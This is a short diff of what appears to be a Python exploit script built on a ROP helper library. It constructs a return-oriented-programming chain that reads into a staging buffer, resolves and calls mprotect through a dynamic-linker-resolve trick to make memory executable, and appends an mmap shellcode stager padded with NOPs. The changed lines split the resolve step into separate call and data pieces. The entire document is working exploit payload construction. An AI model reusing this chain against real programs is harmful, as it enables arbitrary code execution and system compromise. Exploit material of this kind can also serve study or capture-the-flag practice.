@@ -24,7 +24,11 @@ buf = rop.call_chain_ptr(
     ['read', 0, addr_dt_debug, 8],
     [ptr_ret, addr_stage & ~0xFFF, 0x1000, 7]
 )
-buf += rop.dl_resolve(addr_stage + len(buf), 'mprotect')
+buf += rop.dl_resolve_call(addr_stage+240)
+buf += rop.p(addr_stage+340)
+buf += rop.fill(240, buf)
+buf += rop.dl_resolve_data(addr_stage+240, 'mprotect')
+buf += rop.fill(340, buf)
 buf += sc.nopfill(sc.mmap_stager(), 400, buf)
 
 p.write(buf)
